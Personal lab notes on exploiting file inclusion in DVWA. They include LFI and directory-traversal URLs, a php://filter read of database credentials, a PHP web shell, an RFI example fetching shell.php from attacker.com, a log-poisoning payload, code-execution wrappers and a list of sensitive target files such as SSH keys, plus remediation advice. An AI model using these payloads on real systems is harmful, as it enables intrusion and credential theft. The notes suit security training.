# Day 12 Notes — File Inclusion (LFI & RFI) on DVWA

---

## 1. What We Did Today Overview

- Understood what Local File Inclusion (LFI) and Remote File Inclusion (RFI) are
- Read sensitive system files using direct LFI (`/etc/passwd`, `/etc/hosts`)
- Confirmed permission-based restrictions on `/etc/shadow`
- Used directory traversal (`../`) to escape the app's base path
- Read PHP source code using the `php://filter` wrapper and decoded base64
- Extracted real database credentials from `config.inc.php`
- Attempted RFI — confirmed disabled on modern PHP
- Attempted log poisoning — payload written to log but not executed due to Docker restrictions
- Performed LFI through Burp Repeater and read raw file contents in the response

---

## 2. What is File Inclusion

### The concept
Many web applications load content dynamically based on a URL parameter. Instead of having separate pages for each section they use one PHP file that includes different content files based on what the user requests:

```
http://site.com/index.php?page=home.php
http://site.com/index.php?page=about.php
http://site.com/index.php?page=contact.php
```

The PHP code behind this looks something like:
```php
<?php
include($_GET['page']);
?>
```

The `include()` function takes the value of the `page` parameter and loads that file into the page. If there is no validation on what file can be requested — you can point it at ANY file on the system.

### Why it exists
Developers use file inclusion for legitimate reasons — templating, modular code, loading language files. The vulnerability appears when they forget to validate or restrict what the `page` parameter can contain.

### Two types
- **LFI (Local File Inclusion)** — include files that already exist on the server
- **RFI (Remote File Inclusion)** — include files hosted on an external server you control

---

## 3. The DVWA File Inclusion Page

### What we saw
DVWA's File Inclusion page had three links: `file1.php`, `file2.php`, `file3.php`. Clicking each one changed the URL to:
```
http://127.0.0.1/vulnerabilities/fi/?page=file1.php
http://127.0.0.1/vulnerabilities/fi/?page=file2.php
http://127.0.0.1/vulnerabilities/fi/?page=file3.php
```

The `page=` parameter directly controls which file gets loaded. No validation, no whitelist, no restriction — whatever you put in `page=` gets passed to PHP's `include()` function.

### The vulnerable PHP code
```php
<?php
$file = $_GET['page'];
include($file);
?>
```
Input goes directly into `include()` with zero sanitization. This is the root cause of every attack we performed today.

---

## 4. Task 1 — Direct LFI: Reading /etc/passwd

### What /etc/passwd is
`/etc/passwd` is a standard Linux file that stores basic user account information. Every user account on the system has one line here. It is readable by all users on the system — including the `www-data` user that Apache runs as.

### The payload
```
http://127.0.0.1/vulnerabilities/fi/?page=/etc/passwd
```

### What we got — full response
The file contents appeared directly on the DVWA page:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

### How to read /etc/passwd format
Each line follows this format:
```
username:password:UID:GID:description:home_directory:shell
```

| Field | Example | Meaning |
|---|---|---|
| username | `root` | Account name |
| password | `x` | Password stored in /etc/shadow (x = shadowed) |
| UID | `0` | User ID — root is always 0 |
| GID | `0` | Group ID |
| description | `root` | Human readable name |
| home | `/root` | Home directory |
| shell | `/bin/bash` | Login shell |

### What this reveals to an attacker
- All usernames on the system → useful for brute force attacks
- Home directory locations → useful for finding config files
- Which users have real shells (`/bin/bash`) vs system accounts (`/usr/sbin/nologin`)
- Service accounts like `mysql` and `www-data` → reveals what services are running
- `www-data` home is `/var/www` → confirms where the web files are

### Real world impact
In a real target `/etc/passwd` reveals the entire user structure of the server. Combined with other vulnerabilities this can lead to full system compromise.

---

## 5. Task 2 — Reading /etc/hosts

### What /etc/hosts is
A file that maps hostnames to IP addresses locally — before DNS is consulted. It shows what internal network the server is part of.

### The payload
```
http://127.0.0.1/vulnerabilities/fi/?page=/etc/hosts
```

### What we got
```
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00:: ip6-localnet
ff00:: ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2 03b6d646ff9d
```

### What this reveals
- `172.17.0.2` is the Docker container's internal IP address
- `03b6d646ff9d` is the container's hostname
- The `172.17.0.x` range is Docker's default internal network
- In a real target this reveals internal IP ranges, hostnames of other servers, internal domain names — all extremely valuable for network reconnaissance

---

## 6. Task 3 — /etc/shadow — Permission Denied

### What /etc/shadow is
`/etc/shadow` stores the actual hashed passwords for all user accounts. Unlike `/etc/passwd` it is only readable by the `root` user — not by `www-data` which is the user Apache runs as.

### The payload
```
http://127.0.0.1/vulnerabilities/fi/?page=/etc/shadow
```

### What we got
**Blank page — no content displayed**

The Burp response showed a full `HTTP/1.1 200 OK` with all DVWA HTML — but the area where file contents would appear was completely empty. The DVWA page structure loaded fine but no shadow file contents appeared.

### Why it was blank — not an error
This is important to understand. The server did NOT return an error. It returned 200 OK. What happened:
1. PHP's `include()` tried to open `/etc/shadow`
2. The `www-data` user doesn't have read permission on `/etc/shadow`
3. PHP silently failed to read the file
4. The page loaded normally but with no file content injected

### What this teaches us
**LFI is limited by the web server's file permissions.** You can only read files that the user running the web server (`www-data`) has access to. This is why:
- `/etc/passwd` → readable by everyone → LFI works ✓
- `/etc/shadow` → only readable by root → LFI fails silently ✗

In a real pentest if you find LFI your first goal is to escalate to reading files you shouldn't be able to access. `/etc/shadow` requires finding another vulnerability to escalate privileges first.

---

## 7. Task 4 — Directory Traversal

### What is directory traversal
Sometimes the app has a base path hardcoded in the include statement:
```php
include("includes/" . $_GET['page']);
```
So `page=file1.php` becomes `includes/file1.php`. You can't just type `/etc/passwd` because it becomes `includes//etc/passwd` which doesn't exist.

The `../` sequence means "go up one directory level" in Linux. By chaining enough `../` sequences you can escape any base directory and reach the filesystem root.

### How the path works
DVWA's file inclusion script is located at:
```
/var/www/html/vulnerabilities/fi/index.php
```
That's 5 directories deep from `/`:
```
/          (root)
└── var
    └── www
        └── html
            └── vulnerabilities
                └── fi
                    └── index.php
```

So you need exactly 5 `../` to get back to `/` and then append `/etc/passwd`.

### What we tried and what happened

**3 levels — blank page:**
```
http://127.0.0.1/vulnerabilities/fi/?page=../../../etc/passwd
```
Not enough `../` — path resolves to somewhere that doesn't contain `/etc/passwd`

**4 levels — blank page:**
```
http://127.0.0.1/vulnerabilities/fi/?page=../../../../etc/passwd
```
Still not enough

**5 levels — success:**
```
http://127.0.0.1/vulnerabilities/fi/?page=../../../../../etc/passwd
```
Full `/etc/passwd` contents displayed — correct number of traversals found

**6 levels — also works:**
```
http://127.0.0.1/vulnerabilities/fi/?page=../../../../../../etc/passwd
```
Also works — going above `/` just stays at `/` in Linux. Extra `../` at root are harmless.

### Why this matters in real hacking
In real targets the app often restricts you to a specific folder. Directory traversal bypasses this restriction. Common targets after confirming traversal:
```
../../../etc/passwd              -- user accounts
../../../etc/hosts               -- network info
../../../var/log/apache2/access.log  -- server logs
../../../home/user/.ssh/id_rsa   -- SSH private keys
../../../var/www/html/config.php -- database credentials
../../../proc/self/environ       -- environment variables
```

---

## 8. Task 5 — PHP Filter Wrapper: Reading PHP Source Code

### The problem
When you use LFI to include a `.php` file the server executes it instead of displaying it. So:
```
http://127.0.0.1/vulnerabilities/fi/?page=../../../../../var/www/html/config/config.inc.php
```
Returns a **blank page** — the PHP file runs but produces no visible output. You can't see the source code.

### The solution — php://filter wrapper
PHP has built-in stream wrappers that modify how files are handled. The `php://filter` wrapper with `convert.base64-encode` reads the file and converts it to base64 before PHP can execute it. Base64 is not PHP code so it just gets displayed as text.

### The payload
```
http://127.0.0.1/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../var/www/html/config/config.inc.php
```

### What appeared on the page — raw base64
```
PD9waHANCg0KIyBJZiB5b3UgYXJlIGhhdmluZyBwcm9ibGVtcyBjb25uZWN0aW5nIHRoZSBNeVNRTCBkYXRhYmFzZSBhbmQgYWxsIG9mIHRoZSB2YXJpYWJsZXMgYmVsb3cgYXJlIGNvcnJlY3QNCiMgdHJ5IGNoYW5naW5nIHRoZSAnZGJfc2VydmVyJyB2YXJpYWJsZSBmcm9tIGxvY2FsaG9zdCB0byAxMjcuMC4wLjEuIEZpeGVzIGEgcHJvYmxlbSBkdWUgdG8gc29ja2V0cy4...
```

The base64 appeared directly on the page in the browser.

### Decoding in terminal
```bash
echo "PD9waHANCg0K..." | base64 -d
```

### What the decoded output revealed — full config file
```php
<?php
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'app';
$_DVWA[ 'db_password' ] = 'vulnerables';
$_DVWA[ 'db_port' ]     = '5432';
?>
```

### Full database credentials exposed
| Field | Value |
|---|---|
| Database server | 127.0.0.1 |
| Database name | dvwa |
| Username | app |
| Password | vulnerables |

### Real world attack chain from this finding
```
LFI found on page= parameter
        ↓
php://filter reads config.inc.php as base64
        ↓
Base64 decoded → database credentials exposed
        ↓
Attacker connects directly to MySQL:
mysql -h target.com -u app -p vulnerables dvwa
        ↓
Full database access — no SQL injection needed
        ↓
Dump all tables, read all data, potentially write data
```

### Real world severity
**Critical.** Database credentials in a config file exposed via LFI gives an attacker:
- Direct database access if port 3306 is externally accessible
- Bypass all application security completely
- Read, modify, or delete all application data

---

## 9. Task 6 — Remote File Inclusion (RFI) — Disabled

### What RFI is
RFI goes beyond reading files — it lets you include a file from YOUR server. If the target fetches and executes your file you have Remote Code Execution (RCE) — full control of the server.

### How it works conceptually
```
Attacker hosts shell.php on their server:
<?php echo shell_exec($_GET['cmd']); ?>

Attacker sends:
http://target.com/page.php?page=http://attacker.com/shell.php&cmd=whoami

Target server fetches attacker's shell.php
Target server executes it
Output of 'whoami' appears on the page
Attacker now has remote code execution
```

### What we attempted
Created a PHP shell locally:
```bash
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > /tmp/shell.php
cd /tmp && python3 -m http.server 8888
```

Tried the RFI payload:
```
http://127.0.0.1/vulnerabilities/fi/?page=http://127.0.0.1:8888/shell.php&cmd=whoami
```

### Result — blank page
RFI did not work. The page returned blank — the server did not fetch our shell.

### Why RFI failed — allow_url_include
RFI requires a PHP setting called `allow_url_include` to be enabled. This setting allows PHP's `include()` to fetch files from remote URLs. It is **disabled by default** in all modern PHP versions because of exactly this attack.

Check the setting:
```bash
sudo docker exec -it $(sudo docker ps -q) php -r "echo ini_get('allow_url_include');"
```
Returns blank or `0` → disabled.

### Why this matters in real bug bounty
RFI is extremely rare in real targets today because:
- `allow_url_include` is off by default since PHP 5.2
- Modern hosting environments never enable it
- WAFs block remote URL patterns in parameters

LFI is what you will actually find. RFI is mostly historical — you'll see it in old CTF challenges and legacy systems.

---

## 10. Task 7 — Log Poisoning: LFI to RCE Attempt

### What log poisoning is
When direct RFI is blocked there's another way to get code execution via LFI. Apache logs every HTTP request — including headers like User-Agent. If you put PHP code in your User-Agent header it gets written to the access log. Then you use LFI to include the log file. When PHP processes the log file it executes your code inside it.

### Step 1 — Poison the log
In Burp Repeater we changed the User-Agent header from:
```
Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
```
To:
```
<?php echo shell_exec($_GET['cmd']); ?>
```
Sent the request — got a normal 200 response. The PHP payload was now written into Apache's access log.

### Confirmed in log — payload written successfully
Running:
```bash
sudo docker exec -it $(sudo docker ps -q) tail -20 /var/log/apache2/access.log
```
Showed:
```
172.17.0.1 - - [24/Apr/2026:10:37:06 +0000] "GET /vulnerabilities/fi/?page=include.php HTTP/1.1" 200 1658 "http://127.0.0.1/vulnerabilities/csrf/" "<?php echo shell_exec($_GET['cmd']); ?>"
```
The PHP payload appeared in the User-Agent field of the log. Payload injection confirmed.

### Step 2 — Include the log via LFI
```
http://127.0.0.1/vulnerabilities/fi/?page=../../../../../var/log/apache2/access.log&cmd=whoami
```

### Result — blank page
Log file was included (200 OK returned) but the PHP payload did not execute. The page returned blank with no command output.

### Why log poisoning failed on this setup
The Docker container's PHP configuration prevents code execution from within log files. Specifically:
- The log file has a `.log` extension — PHP may not process it for execution
- Docker container security restrictions limit what PHP can execute
- The `www-data` user's permissions may restrict log file execution

### Why log poisoning works in real scenarios
On older or misconfigured servers log poisoning is a well-known and effective technique. It works when:
- PHP processes all files through the interpreter regardless of extension
- The web server user has read access to log files
- No security restrictions on included file types

This technique is commonly seen in CTF challenges and older Apache configurations. Understanding it is essential even if this specific Docker setup prevented execution.

### The full attack chain when it works
```
Find LFI vulnerability
        ↓
Inject PHP payload into User-Agent header via Burp
        ↓
Apache writes payload to access.log
        ↓
Use LFI to include access.log
        ↓
PHP executes the payload inside the log
        ↓
Remote Code Execution achieved
        ↓
Run any OS command via ?cmd= parameter
```

---

## 11. Task 8 — LFI Through Burp Repeater

### Why use Repeater for LFI
Burp Repeater lets you test many different file paths quickly without manually editing the URL in the browser every time. You can also see the raw HTTP response — file contents appear before the HTML making them easy to find.

### What we did
Sent a DVWA request to Repeater → changed the URL parameter:
```
GET /vulnerabilities/fi/?page=../../../../../etc/passwd HTTP/1.1
```

### Raw HTTP response — file contents before HTML
```
HTTP/1.1 200 OK
Date: Fri, 24 Apr 2026 10:53:02 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 4219
Content-Type: text/html;charset=utf-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"...
```

The file contents appear at the top of the response body — before the DVWA HTML starts. This makes it easy to read without having to look through rendered page output.

---

## 12. LFI vs RFI — Full Comparison

| | LFI | RFI |
|---|---|---|
| What it includes | Files on the server | Files on attacker's server |
| PHP requirement | Just `include()` | `allow_url_include=On` |
| Common today | Very common | Very rare |
| Max impact | Read sensitive files, log poisoning RCE | Instant Remote Code Execution |
| Real world frequency | High | Very low |
| CTF frequency | High | Medium |

---

## 13. Files to Always Try with LFI

```bash
# User information
/etc/passwd                          # all user accounts
/etc/shadow                          # password hashes (root only)
/etc/group                           # group memberships

# Network information
/etc/hosts                           # hostname to IP mappings
/etc/resolv.conf                     # DNS server config
/etc/network/interfaces              # network interface config

# Web server config
/etc/apache2/apache2.conf            # Apache main config
/etc/apache2/sites-enabled/000-default.conf  # virtual hosts
/var/log/apache2/access.log          # access logs (for log poisoning)
/var/log/apache2/error.log           # error logs

# Application files
/var/www/html/config.php             # common config file names
/var/www/html/config/config.inc.php  # DVWA style config
/var/www/html/.env                   # Laravel/modern framework config
/var/www/html/wp-config.php          # WordPress config

# SSH keys
/home/user/.ssh/id_rsa               # private SSH key
/root/.ssh/id_rsa                    # root's private SSH key

# System info
/proc/version                        # kernel version
/proc/self/environ                   # environment variables
```

---

## 14. PHP Wrappers for LFI

```
php://filter/convert.base64-encode/resource=file.php    -- read PHP as base64
php://filter/read=string.rot13/resource=file.php         -- read PHP with rot13
php://input                                              -- execute POST body as PHP
data://text/plain,<?php system('whoami');?>              -- execute inline code
expect://whoami                                          -- execute commands (rare)
```

---

## 15. How to Fix File Inclusion Vulnerabilities

### Bad code (what DVWA does)
```php
include($_GET['page']);
```

### Fixed code — whitelist approach
```php
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed)) {
    include($page . '.php');
} else {
    include('home.php');
}
```

### Additional defenses
- Never pass user input directly to `include()` or `require()`
- Use a whitelist of allowed files — never a blacklist
- Set `allow_url_include=Off` in PHP config (default in modern PHP)
- Set `allow_url_fopen=Off` to prevent remote file access
- Run web server as a low-privilege user (www-data, not root)
- Use `open_basedir` in PHP config to restrict which directories PHP can access

---

## 16. Key Concepts Summary

| Term | Meaning |
|---|---|
| LFI | Include files that exist on the server via unsanitized input |
| RFI | Include files from a remote server — requires allow_url_include=On |
| Directory traversal | Using `../` to escape a restricted directory |
| `../` | Go up one directory level in Linux |
| php://filter | PHP stream wrapper that reads files as base64 before execution |
| base64 | Encoding that converts binary/text to safe ASCII — used to read PHP files |
| Log poisoning | Writing PHP payload to a log file then including it via LFI |
| www-data | The user Apache runs as — determines which files LFI can read |
| allow_url_include | PHP setting required for RFI — disabled by default in modern PHP |
| config.inc.php | Configuration file — prime target for LFI — often contains DB credentials |

---

*Day 12 complete. You successfully read system files, extracted database credentials, decoded base64 encoded PHP source, and understood why LFI is one of the most impactful web vulnerabilities. Tomorrow is Day 13 — File Upload attacks on DVWA.*
